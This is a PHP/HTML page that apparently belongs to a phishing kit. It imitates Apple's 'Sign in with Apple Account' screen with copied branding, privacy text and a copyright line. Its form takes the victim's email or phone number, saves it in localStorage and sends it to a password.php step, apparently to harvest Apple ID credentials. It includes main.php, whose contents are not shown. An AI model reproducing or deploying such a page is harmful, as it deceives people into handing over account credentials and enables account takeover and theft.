<?php require 'main.php';?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/login.css">
    <title>Document</title>
</head>
<body>
    <header>
        <div class="logo"><img src="res/img/logo.png"></div>
        <div class="right"><img src="res/img/icon.png"></div>
    </header>
    <main>
        <div class="continer">
            <form id="loginForm" action="password.php" method="get" onsubmit="storeEmail()">
            <div class="log"><img src="res/img/log.png"></div>
            <div class="title">Sign in with Apple Account</div>
            <div class="col"><input type="text" id="email" name="email" required> <label for="email">Email or Phone Number</label></div>
            <div class="a"><a href="#">Create Your Apple Account</a></div>
            <div class="acc"><img src="res/img/icon2.png"></div>
            <div class="p"><p>Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services.<a href="#">See how your data is managed...</a></p></div>
            <div class="btn">
            <div class="bu1"><button type="submit">Continue</button></div>
            <div class="bu2"><button onclick="mov()"><img src="res/img/ip.svg" class="icon" >Sign in with iPhone</button></div>
            </div>
            <div class="r">Requires a device with iOS 17 or later.</div>
            </form>
        </div>
    </main>
    <footer>
        <div class="f1"><a href="#">System Status</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms & Conditions</a></div>
        <div class="f2">Copyright © 2026 Apple Inc. All rights reserved.</div>
    </footer>
     <script>
       function storeEmail() {
       const email = document.getElementById("email").value;
       localStorage.setItem("user_email", email); } 
      </script>

        <script>
    function mov() {
      window.location = "login.php"; }
  </script>
</body>
</html>